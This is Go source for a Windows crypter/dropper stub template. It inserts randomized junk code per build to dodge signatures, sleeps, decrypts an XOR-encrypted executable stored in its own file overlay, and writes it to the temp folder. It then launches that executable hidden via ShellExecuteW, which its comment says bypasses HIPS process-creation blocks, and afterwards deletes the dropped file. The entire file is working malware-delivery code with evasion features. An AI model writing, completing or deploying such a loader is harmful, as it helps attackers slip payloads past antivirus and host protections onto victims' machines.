//go:build windows
// +build windows

// {{RANDOM_HEADER}}
// {{RANDOM_BUILD_ID}}

package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================
// RANDOMIZED BUILD IDENTITY (unique per compile)
// ============================================================
var buildMarker = "{{BUILD_MARKER}}"
var xorKey = [64]byte{ {{KEY_BYTES}} }

// LOGGER
var logWriter io.Writer

func initLog() {
	logPath := filepath.Join(os.TempDir(),
		fmt.Sprintf("ps_ovl_%s.log", time.Now().Format("20060102_150405")))
	f, _ := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	logWriter = f
	logf("[OVERLAY] PID=%d EXE=%s", os.Getpid(), os.Args[0])
}

func logf(format string, args ...any) {
	msg := fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05.000"),
		fmt.Sprintf(format, args...))
	if logWriter != nil {
		logWriter.Write([]byte(msg))
	}
}

// ============================================================
// RANDOM JUNK (compiled in, never called)
// ============================================================
type {{JUNK_TYPE}} struct {
	a uint64
	b [{{JUNK_SIZE}}]byte
}

var _{{JUNK_VAR_1}} = func() uint32 {
	v := uint32({{JUNK_SEED}})
	for i := 0; i < {{JUNK_LOOP}}; i++ {
		v ^= v<<13; v ^= v>>17; v ^= v<<5
	}
	return v
}()

var _{{JUNK_VAR_2}} = func() string {
	h := sha256.Sum256([]byte(buildMarker + hex.EncodeToString(xorKey[:])))
	return hex.EncodeToString(h[:{{JUNK_HASH}}])
}()

func {{JUNK_FUNC}}(b []byte) uint32 {
	var h uint32 = 0x{{JUNK_XOR}}
	for _, c := range b { h = h*31 + uint32(c) }
	return h
}

// ============================================================
// ENTRY POINT
// ============================================================
func main() {
	initLog()
	defer func() {
		if r := recover(); r != nil {
			logf("[OVERLAY] PANIC: %v", r)
		}
		logf("[OVERLAY] Exit")
	}()

	// Phase 1: Short random delay
	delay := {{DELAY_MIN}} + rand.Intn({{DELAY_RANGE}})
	logf("[OVERLAY] Sleep %ds", delay)
	time.Sleep(time.Duration(delay) * time.Second)

	// Phase 2: Read encrypted payload from own overlay
	exePath, err := os.Executable()
	if err != nil {
		logf("[OVERLAY] ERROR: os.Executable() failed: %v", err)
		return
	}
	logf("[OVERLAY] Self: %s", exePath)

	f, err := os.Open(exePath)
	if err != nil {
		logf("[OVERLAY] ERROR: cannot open self: %v", err)
		return
	}
	defer f.Close()

	// Read 8-byte size marker at EOF
	fi, _ := f.Stat()
	fileSize := fi.Size()

	if fileSize < 8 {
		logf("[OVERLAY] ERROR: file too small (%d bytes)", fileSize)
		return
	}

	f.Seek(-8, io.SeekEnd)
	var payloadSize uint64
	binary.Read(f, binary.LittleEndian, &payloadSize)

	if payloadSize == 0 || int64(payloadSize) > fileSize-8 {
		logf("[OVERLAY] ERROR: bad payload size marker: %d (file=%d)", payloadSize, fileSize)
		return
	}
	logf("[OVERLAY] Payload marker: %d bytes", payloadSize)

	// Read payload
	payloadStart := fileSize - 8 - int64(payloadSize)
	f.Seek(payloadStart, io.SeekStart)
	encrypted := make([]byte, payloadSize)
	_, err = io.ReadFull(f, encrypted)
	if err != nil {
		logf("[OVERLAY] ERROR: read payload: %v", err)
		return
	}

	// Phase 3: XOR decrypt
	logf("[OVERLAY] Decrypting %d bytes...", len(encrypted))
	decrypted := make([]byte, len(encrypted))
	for i := range encrypted {
		decrypted[i] = encrypted[i] ^ xorKey[i%len(xorKey)]
	}

	// Verify PE header
	if len(decrypted) < 2 || decrypted[0] != 0x4D || decrypted[1] != 0x5A {
		logf("[OVERLAY] ERROR: bad PE header after decrypt. First bytes: %02X %02X",
			decrypted[0], decrypted[1])
		return
	}
	logf("[OVERLAY] PE header OK (MZ) — %d bytes", len(decrypted))

	// Phase 4: Write to %TEMP%
	tmpPath := filepath.Join(os.TempDir(), randomName()+".exe")
	logf("[OVERLAY] Writing: %s", tmpPath)
	err = os.WriteFile(tmpPath, decrypted, 0644)
	if err != nil {
		logf("[OVERLAY] ERROR: write fail: %v", err)
		return
	}

	// Phase 5: Execute via ShellExecuteW (proxied through explorer.exe)
	// This bypasses HIPS "restricted group" CreateProcess blocks because
	// the process creation appears to come from explorer.exe, not our stub.
	logf("[OVERLAY] Executing via ShellExecuteW...")
	shell32 := syscall.NewLazyDLL("shell32.dll")
	procShellExec := shell32.NewProc("ShellExecuteW")

	exePtr, _ := syscall.UTF16PtrFromString(tmpPath)
	ret, _, _ := procShellExec.Call(
		0, // hwnd = NULL
		0, // lpOperation = NULL → "open"
		uintptr(unsafe.Pointer(exePtr)),
		0, // lpParameters = NULL
		0, // lpDirectory = NULL
		0, // nShowCmd = SW_HIDE
	)

	if ret <= 32 {
		logf("[OVERLAY] ERROR: ShellExecuteW returned %d", ret)
		os.Remove(tmpPath)
		return
	}
	logf("[OVERLAY] ShellExecuteW OK (ret=%d) — waiting 60s before cleanup", ret)
	time.Sleep(60 * time.Second)
	os.Remove(tmpPath)
	logf("[OVERLAY] Done")
}

func randomName() string {
	const c = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, {{NAME_LEN}})
	for i := range b { b[i] = c[rand.Intn(len(c))] }
	return string(b)
}
